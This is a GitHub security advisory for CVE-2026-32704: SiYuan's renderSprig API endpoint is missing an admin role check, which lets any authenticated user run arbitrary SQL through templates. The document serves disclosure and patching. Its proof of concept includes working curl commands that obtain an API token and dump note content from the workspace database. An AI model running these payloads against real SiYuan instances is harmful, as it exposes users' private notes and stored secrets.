# [M] SiYuan's renderSprig has a missing admin check that allows any user to read full workspace DB

## Summary
Severity: Medium
Advisory: GHSA-4j3x-hhg2-fm2x
CVE: CVE-2026-32704
CWE: CWE-285, CWE-732
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-4j3x-hhg2-fm2x
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <3.6.1

## Details
### Summary
`POST /api/template/renderSprig` lacks `model.CheckAdminRole`, allowing any authenticated user to execute arbitrary SQL queries against the SiYuan workspace database and exfiltrate all note content, metadata, and custom attributes.

### Details
**File:** `kernel/api/router.go`

Every sensitive endpoint in the codebase uses `model.CheckAuth + model.CheckAdminRole`, but `renderSprig` only has `CheckAuth`:

```go
//  Missing CheckAdminRole
ginServer.Handle("POST", "/api/template/renderSprig",
    model.CheckAuth, renderSprig)

//  Correct pattern used by all other data endpoints
ginServer.Handle("POST", "/api/template/render",
    model.CheckAuth, model.CheckAdminRole, model.CheckReadonly, renderTemplate)
```

`renderSprig` calls `model.RenderGoTemplate` (`kernel/model/template.go`) which registers SQL functions from `kernel/sql/database.go`:

```go
(*templateFuncMap)["querySQL"] = func(stmt string) (ret []map[string]interface{}) {
    ret, _ = Query(stmt, 1024)  // executes raw SELECT, no role check
    return
}
```

Any authenticated user - including Publish Service **Reader** role accounts - can call this endpoint and execute arbitrary SELECT queries.

### PoC
**Environment:**
```bash
docker run -d --name siyuan -p 6806:6806 \
  -v $(pwd)/workspace:/siyuan/workspace \
  b3log/siyuan --workspace=/siyuan/workspace --accessAuthCode=test123
```

**Exploit:**
```bash
# Step 1: Login and retrieve API token
curl -s -X POST http://localhost:6806/api/system/loginAuth \
  -H "Content-Type: application/json" \
  -d '{"authCode":"test123"}' -c /tmp/siy.cookie

sleep 15  # wait for boot

TOKEN=$(curl -s -X POST http://localhost:6806/api/system/getConf \
  -b /tmp/siy.cookie -H "Content-Type: application/json" -d '{}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['conf']['api']['token'])")

# Step 2: Execute SQL as non-admin user
curl -s -X POST http://localhost:6806/api/template/renderSprig \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template":"{{querySQL \"SELECT count(*) as n FROM blocks\" | toJson}}"}'
```

**Confirmed response on v3.6.0:**
```json
{"code":0,"msg":"","data":"[{\"n\":0}]"}
```

**Full note dump:**
```bash
curl -s -X POST http://localhost:6806/api/template/renderSprig \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template":"{{range $r := (querySQL \"SELECT hpath,content FROM blocks LIMIT 100\")}}{{$r.hpath}}: {{$r.content}}\n{{end}}"}'
```

### Impact
Any authenticated user (API token holder, Publish Service Reader) can:
- Dump **all note content** and document hierarchy from the workspace
- Exfiltrate tags, custom attributes, block IDs, and timestamps
- Search notes for stored passwords, API keys, or personal data
- Enumerate all notebooks and their structure

This is especially severe in shared or enterprise deployments where lower-privilege accounts should not have access to other users' notes.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-4j3x-hhg2-fm2x
- https://nvd.nist.gov/vuln/detail/CVE-2026-32704
- https://github.com/siyuan-note/siyuan/issues/17209
- https://github.com/siyuan-note/siyuan
